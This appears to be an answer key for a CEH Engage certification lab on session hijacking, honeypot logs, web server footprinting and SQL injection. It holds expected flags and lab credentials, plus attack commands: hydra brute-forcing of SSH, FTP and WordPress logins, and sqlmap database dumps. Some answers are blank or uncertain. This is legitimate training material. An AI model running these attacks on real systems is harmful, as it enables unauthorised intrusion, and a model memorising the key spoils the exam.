## CEH Engage – Part III  
Session Hijacking  
Evading IDS  
Firewalls and Honeypots  
Hacking Web Servers  
Hacking Web Applications  
SQL Injection

---

**Q1. An attacker attempted session hijacking on a machine from the 172.30.10.0/24 subnet. Analyze the packet capture file $_Jack.pcapng and determine the IP address of the victim machine targeted by the attacker. (Format: NNN.NN.NN.NNN)**

**Answer:** 172.30.10.200

**Explanation:**  

In Wireshark, apply the filter:
`tcp.analysis.flags`

Look for TCP retransmissions (black highlight with red text).  
The non-server IP represents the attacker; the other IP is the victim.

---

**Q2. An attacker intercepted an HTTP login session. Analyze Intercep_$niffer.pcapng and determine the captured credentials. (Format: aaa/aaaa)**

**Answer:** lee/test

**Explanation:**  

In Wireshark, apply:
`http && ip.addr == <victim IP>`

Or filter POST requests:
`http.request.method == POST`

Search for login requests such as `login.aspx`.

---

**Q3. A honeypot was deployed in the 192.168.10.0/24 subnet. Analyze cowrie.log and determine the attacker IP attempting access. (Format: NNN*NN*NN*NN)**

**Answer:** 172.30.10.99

**Explanation:**  

Navigate to the directory containing the log file and run:
`tail cowrie.log`

Or open the file with a text editor and review failed authentication attempts.

---

**Q4. Conduct footprinting on www.certifiedhacker.com and identify the web server technology used. (Format: Aaaaaa)**

**Answer:** Apache

**Explanation:**  

Use Netcat or Telnet:
`nc -vv www.moviescope.com 80`  
`GET / HTTP/1.0`

Or:
`telnet www.moviescope.com 80`

Alternatively, use NSE:
`nmap -sV --script=http-enum <target website>`

---

**Q5. Crack SSH credentials for user Martin and retrieve the password stored in $ollers.txt. (Format: aNaa**NNNNNAA*)**

**Answer:** i2tr&^72546HJ*

**Explanation:**  

Scan for SSH service:
`nmap -p 22 192.168.10.0/24 --open`

Brute-force credentials:
`hydra -L Martin -P password.txt 192.168.10.101 ssh`

Connect via SSH:
`sshpass -p qwerty1234 ssh Martin@192.168.10.101`

Navigate to Desktop and read the file:
`type $ollers.txt`

---

**Q6. Crack FTP credentials of user nick and determine the domain ID stored in w_domain.txt. (Format: NNNNNNNNNN)**

**Answer:** 7867721010

**Explanation:**  

Scan for FTP service:
`nmap -p 21 192.168.10.0/24 --open`

Brute-force FTP credentials:
`hydra -L nick -P password.txt 192.168.10.111 ftp`

Log in and retrieve the file:
`ftp nick@192.168.10.111`  
`get w_domain.txt`

Review the file and note the ID value.

---

**Q7. Exploit a vulnerable web application running on port 8080 and retrieve the content of RootFlag.txt. (Format: Aa*aaNNNN)**

**Answer:** 

**Explanation:**  

Identify the host running the web service on port 8080.  
Navigate to `192.168.0.222:8080`.

Follow Mod13 Task2 steps to exploit the Log4j vulnerability, obtain a reverse shell, and execute:
`cat RootFlag.txt`

---

**Q8. Analyze webpent.txt and identify the Meta-Author of the highlighted website. (Format: AA-Aaaaaaa)**

**Answer:** EC-Council

**Explanation:**  

Connect to the target via SSH using credentials obtained earlier.  
Navigate to the appropriate directory and analyze the website using:
`whatweb www.moviescope.com`

---

**Q9. Identify the attack category of the oldest CVE affecting www.goodshopping.com. (Format: aaaaa*aaaa aaaaaaaaaa (AAA))**

**Answer:** Unclear how to determine “oldest CVE”

**Explanation:**  

Run Wapiti:
`wapiti -u https://<targetwebsite>`

Open the generated report and analyze CVE details to identify the earliest affected vulnerability.

---

**Q10. Identify the missing security policy required to mitigate XSS and SQL Injection attacks on www.goodshopping.com. (Format: Aaaaaaa Aaaaaaaa Aaaaaa)**

**Answer:** Content Security Policy

**Explanation:**  

Run Wapiti against the target website and review the HTML report to identify missing security headers.

---

**Q11. Retrieve the smart scanner report from a Windows Server 2019 machine and determine the total number of directory listing entries. (Format: NN)**

**Answer:** 

**Explanation:**  

FTP is open on the Windows Server:
`hydra -L username.txt -P password.txt 192.168.10.144 ftp`

Credentials: Parker / Passw0rd@1234  
Retrieve `w_report.pdf` and review directory listing findings.

---

**Q12. Perform a brute-force attack on www.cehorg.com and determine the password of user adam. (Format: aaaaaaNNNN)**

**Answer:** orange1234

**Explanation:**  

Use WPScan:
`wpscan --url http://<ip>:8080/CEH/wp-login.php -U Adam -P password.txt`

---

**Q13. Identify the number of risk categories found on moviescope.com. (Format: N)**

**Answer:** 3

**Explanation:**  

Run Wapiti against the target website.  
Open the generated HTML report and count the listed risk categories.

---

**Q14. Perform a SQL Injection attack on www.moviescope.com and determine the number of users in the database. (Format: N)**

**Answer:** 5

**Explanation:**  

Log in using credentials from Question 2.  
Capture the session cookie and use SQLMap:
`sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="<cookie>" --dbs`  
`sqlmap -D moviescope -T User_Login --dump`

---

**Q15. Perform a SQL Injection vulnerability scan and determine the WASC ID for SQL Injection. (Format: NN)**

**Answer:** 19

**Explanation:**  

Use ZAP 2.4 to scan the target website and identify the WASC classification for SQL Injection.

